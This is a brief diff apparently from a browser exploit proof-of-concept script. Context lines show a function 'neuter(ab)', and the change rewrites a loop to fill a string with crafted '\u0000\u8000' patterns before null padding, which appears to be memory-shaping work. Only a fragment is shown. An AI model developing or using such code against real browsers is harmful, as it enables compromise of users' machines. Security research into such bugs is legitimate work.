@@ -1,6 +1,6 @@
 <script>
 
-alert("starta");
+alert("startb");
 
 function neuter(ab) {
 
@@ -42,9 +42,10 @@ var x = "1";
 var y = "";
 
 var tmpy="";
-
-for(var i=0;i<0x10000;i++){
-
+for(var i=0;i<0x28;i++){
+    y+="\u0000\u8000";
+}
+for(var i=0x50;i<0x10000;i++){
     y+="\u0000";
 
 }
